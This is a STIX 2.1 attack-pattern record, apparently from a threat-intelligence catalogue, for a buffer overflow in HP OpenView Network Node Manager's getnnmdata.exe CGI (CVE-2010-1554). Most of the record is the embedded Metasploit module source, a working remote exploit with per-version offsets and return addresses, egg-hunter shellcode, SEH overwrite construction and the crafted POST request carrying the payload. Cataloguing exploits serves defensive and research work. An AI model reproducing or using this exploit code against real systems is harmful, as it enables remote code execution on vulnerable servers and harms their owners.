{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5288707f-7476-4109-ab7a-9aaee8f3db75",
    "created": "2024-08-14T16:53:24.383631Z",
    "modified": "2024-08-14T16:53:24.383635Z",
    "name": "HP OpenView Network Node Manager getnnmdata.exe (ICount) CGI Buffer Overflow",
    "description": " This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53. By sending specially crafted ICount parameter to the getnnmdata.exe CGI an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_nnm_getnnmdata_icount.rb",
            "external_id": "hp_nnm_getnnmdata_icount.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1554"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/getnnmdata.exe', :pattern => /Hewlett-Packard Development Company/ }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Network Node Manager getnnmdata.exe (ICount) CGI Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in HP OpenView Network Node Manager 7.50/7.53.\n        By sending specially crafted ICount parameter to the getnnmdata.exe CGI,\n        an attacker may be able to execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-1554' ],\n          [ 'OSVDB', '64976' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\",\n          'DisableNops' => 'True',\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'EncoderOptions' =>\n            {\n              'BufferRegister' => 'ECX',\n            },\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP OpenView Network Node Manager 7.50', { 'Offset' => 7582, 'Ret' => 0x5a01f277 } ],\n          [ 'HP OpenView Network Node Manager 7.53', { 'Offset' => 2052, 'Ret' => 0x5a666d69 } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-05-11'))\n  end\n\n  def exploit\n\n    egg = rand_text_alpha_upper(4)\n\n    hunter =  \"\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a\\x74\"\n    hunter << \"\\xef\\xb8\" + egg + \"\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7\"\n\n    boom =  rand_text_alpha_upper(target['Offset'])\n    boom << generate_seh_record(target.ret)\n    boom << hunter + egg + egg\n    boom << payload.encoded\n    boom << rand_text_alpha_upper(9024 - payload.encoded.length)\n\n    sploit =  \"SnmpVals=&ICount=-9#{boom}\"\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_request_cgi({\n      'uri'\t\t=> '/OvCgi/getnnmdata.exe',\n      'method'\t=> 'POST',\n      'data'\t\t=> sploit\n      }, 8)\n\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-05-11",
    "x_mitre_platforms": [
        "win'"
    ]
}